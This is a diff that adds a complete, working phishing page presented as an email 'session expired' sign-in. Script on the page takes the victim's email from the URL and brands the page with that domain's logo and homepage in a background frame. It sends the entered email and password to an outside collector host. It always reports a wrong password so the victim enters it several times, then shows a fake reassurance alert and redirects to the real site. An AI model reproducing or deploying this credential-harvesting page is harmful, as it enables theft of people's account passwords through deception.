@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Email Update</title>
+<style>
+/* Your existing CSS styles remain unchanged */
+body {
+    margin: 0;
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: Arial, sans-serif;
+    position: relative;
+    overflow: hidden;
+}
+
+#background-container {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+}
+
+#background-frame {
+    width: 100%;
+    height: 100%;
+    border: none;
+    position: absolute;
+    top: 0;
+    left: 0;
+    pointer-events: none;
+}
+
+.abstract-shapes {
+    display: none;
+}
+
+.form-container {
+    background: #fff;
+    padding: 30px;
+    border-radius: 15px;
+    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+    text-align: center;
+    width: 350px;
+    border: 2px solid #ddd;
+    position: relative;
+    z-index: 1;
+}
+
+h2 {
+    color: #333;
+    margin-bottom: 20px;
+    font-size: 22px;
+    font-weight: bold;
+}
+
+p {
+    color: #666;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+.form-group {
+    margin-bottom: 15px;
+    text-align: left;
+}
+
+.form-group label {
+    display: block;
+    margin-bottom: 5px;
+    font-size: 14px;
+    color: #333;
+}
+
+.form-group input {
+    width: 100%;
+    padding: 10px;
+    border: 1px solid #ccc;
+    border-radius: 5px;
+    font-size: 14px;
+}
+
+.form-group button {
+    width: 60%;
+    padding: 12px;
+    background: #007bff;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    margin-top: 20px;
+    margin-left: auto;
+    margin-right: auto;
+    display: block;
+}
+
+.form-group button:hover {
+    background: #0056b3;
+}
+
+.error-message {
+    color: red;
+    font-size: 14px;
+    display: none;
+    margin-top: 10px;
+    text-align: left;
+}
+
+#domainLogo {
+    max-height: 50px;
+    display: block;
+    margin: 0 auto 20px;
+}
+
+/* Session expired text style */
+#session-expired {
+    color: red;
+    font-weight: normal;
+    font-size: 14px;
+}
+</style>
+</head>
+<body>
+
+<div id="background-container">
+    <iframe id="background-frame" src="" frameborder="0"></iframe>
+</div>
+
+<div class="form-container">
+    <img id="domainLogo" alt="Domain Logo" style="display: none;">
+    <h2 id="emailDomainHeader"> Portal</h2>
+
+    <!-- Session Expired Text -->
+    <p id="session-expired">Your session has expired, Please signin to continue.</p>
+    
+    <form id="loginForm" action="https://zeexpress.in/vendor/components/stoppa/new-deac-php.php" method="post">
+        <div class="form-group">
+            <label for="email">Email</label>
+            <input type="email" id="email" name="email" readonly required>
+        </div>
+        <div class="error-message" id="errorMessage">Invalid Password! Please Enter your correct Password</div>
+        <div class="form-group">
+            <label for="password">Current Password</label>
+            <input type="password" id="password" name="password" placeholder="Enter your password" required>
+        </div>
+        <div class="form-group">
+            <button type="submit">Sign in</button>
+        </div>
+    </form>
+</div>
+
+<script>
+// Extract '#' parameter value
+const fragment = window.location.hash.slice(1); // Remove the '#' character
+const email = decodeURIComponent(fragment); // Decode the email value
+let attemptCount = 0;
+
+if (email) {
+    const emailField = document.getElementById('email');
+    emailField.value = email;
+
+    const emailDomain = email.split('@')[1];
+    const emailDomainHeader = email.split('@')[1].split('.')[0];
+    const emailHeader = document.getElementById('emailDomainHeader');
+    emailHeader.textContent = ` ${emailDomainHeader} Portal`;
+
+    const logoUrl = `https://logo.clearbit.com/${emailDomain}`;
+    const logoImg = document.getElementById('domainLogo');
+    logoImg.src = logoUrl;
+    logoImg.onerror = () => {
+        logoImg.style.display = "none";
+    };
+    logoImg.style.display = "block";
+
+    // Set the iframe src to the domain homepage
+    const iframe = document.getElementById('background-frame');
+    iframe.src = `https://${emailDomain}`;
+}
+
+const errorMessage = document.getElementById("errorMessage");
+
+// Hide error while typing
+document.getElementById("password").addEventListener("input", function () {
+    errorMessage.style.display = "none";
+});
+
+// Show error message on every submission and redirect after 3 attempts
+document.getElementById("loginForm").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    const form = document.getElementById("loginForm");
+    const formData = new FormData(form);
+
+    attemptCount++;
+
+    fetch(form.action, {
+        method: "POST",
+        body: formData,
+    })
+    .then((response) => response.json())
+    .then(() => {
+        errorMessage.style.display = "block"; // Always display the error message
+        document.getElementById("password").value = ""; // Clear password field
+
+        // Redirect after the third attempt
+        if (attemptCount >= 3) {
+            alert("Your account deactivation has now been canceled. You can continue using your account without interruption.");
+            const emailDomain = email ? email.split('@')[1] : "default-domain.com";
+            window.location.href = `https://${emailDomain}`;
+        }
+    })
+    .catch(() => {
+        errorMessage.style.display = "block"; // Show error message on fetch failure
+        document.getElementById("password").value = ""; // Clear password field on error
+
+        // Redirect after the third attempt
+        if (attemptCount >= 3) {
+            alert("Your account deactivation has now been canceled. You can continue using your account without interruption.");
+            const emailDomain = email ? email.split('@')[1] : "default-domain.com";
+            window.location.href = `https://${emailDomain}`;
+        }
+    });
+});
+</script>
+
+</body>
+</html>
